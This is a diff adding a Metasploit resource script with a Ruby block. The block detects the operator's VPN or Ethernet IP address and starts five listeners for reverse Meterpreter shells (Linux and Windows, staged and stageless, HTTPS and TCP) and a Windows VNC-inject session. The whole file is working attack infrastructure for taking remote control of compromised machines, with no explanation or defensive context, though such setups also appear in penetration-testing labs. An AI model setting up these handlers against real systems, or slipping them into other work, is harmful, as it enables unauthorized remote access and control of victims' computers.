@@ -1,0 +1,24 @@
+<ruby>
+def payload_lhost
+  tun0_ip = %x(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1).strip
+  if tun0_ip.empty?
+    %x(ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1).strip
+  else
+    tun0_ip
+  end
+end
+
+# def payload_lport
+#   framework.datastore['LPORT'] || 8080
+# end
+
+
+run_single("handler -H #{payload_lhost} -P 5000 -p linux/x64/meterpreter_reverse_https -n LINUX_STAGELESS_HTTPS_5000")
+run_single("handler -H #{payload_lhost} -P 5001 -p linux/x64/meterpreter/reverse_tcp -n LINUX_STAGED_TCP_5001")
+run_single("handler -H #{payload_lhost} -P 8443 -p windows/x64/meterpreter/reverse_https -n WINDOWS_STAGED_HTTPS_8443")
+run_single("handler -H #{payload_lhost} -P 8444 -p windows/x64/meterpreter_reverse_https -n WINDOWS_STAGELESS_HTTPS_8444")
+run_single("handler -H #{payload_lhost} -P 8445 -p windows/x64/vncinject/reverse_https -n WINDOWS_STAGED_VNC_HTTPS_8445")
+
+
+sleep(1)
+</ruby>
